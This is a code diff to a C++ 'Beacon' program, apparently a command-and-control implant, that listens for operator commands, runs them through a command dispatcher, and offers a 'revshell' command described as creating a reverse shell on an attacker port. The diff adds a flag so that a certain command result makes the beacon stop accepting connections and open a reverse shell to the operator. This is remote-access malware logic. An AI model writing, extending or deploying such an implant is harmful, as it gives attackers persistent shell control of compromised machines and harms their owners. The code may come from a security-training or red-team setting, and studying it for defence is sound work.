@@ -23,6 +23,8 @@ Beacon::Beacon(int bid, int bport, const char *b_attached_to)
     attached_to = b_attached_to;
 }
 
+int stop_accept = 0;
+
 void Beacon::await_update()
 {
     int beacon_fd, new_socket, valread;
@@ -62,6 +64,11 @@ void Beacon::await_update()
     std::string resp;
     while (true){
         char buf[1024];
+        if (stop_accept == 1){
+            revshell(get_port());
+            stop_accept = 0;
+            continue;
+        }
         if ((new_socket = accept(beacon_fd, (struct sockaddr *)&address,
                                 (socklen_t *)&addrlen)) < 0)
         {
@@ -72,6 +79,10 @@ void Beacon::await_update()
         sleep(1);
         if (valread != 0){
             resp = respond(b);
+            if (stop_accept == 1){
+                close(new_socket);
+                continue;
+            }
             send(new_socket, resp.c_str(), strlen(resp.c_str()), 0);
         }
         close(new_socket);
@@ -94,13 +105,15 @@ std::string Beacon::respond(std::string buf){
     }
     /// COMMAND LINE EXECUTION GOES HERE ///
     std::string cmd = update["cmd"];
-    // Check if command exists in cmdline
 
     auto [result, op] = cmdline.accept(cmd);
     switch(result){
         case 1:
             cout = "invalid parameter(s) for " + op + ".\nrevshell <LPORT> : create reverse shell on attacker port <LPORT>";
             status = 300;
+            break;
+        case 99:
+            stop_accept = 1;
             break;
         case 101:
             cout = "unable to initiate reverse shell: port in use";
@@ -144,6 +157,6 @@ Beacon beacon(beacon_id, beacon_port, beacon_ip_addr);
 
 int main()
 {
-    cmdline.setcmd("revshell","","",revshell);
+    cmdline.setcmd("revshell","","",rs);
     beacon.await_update();
 }
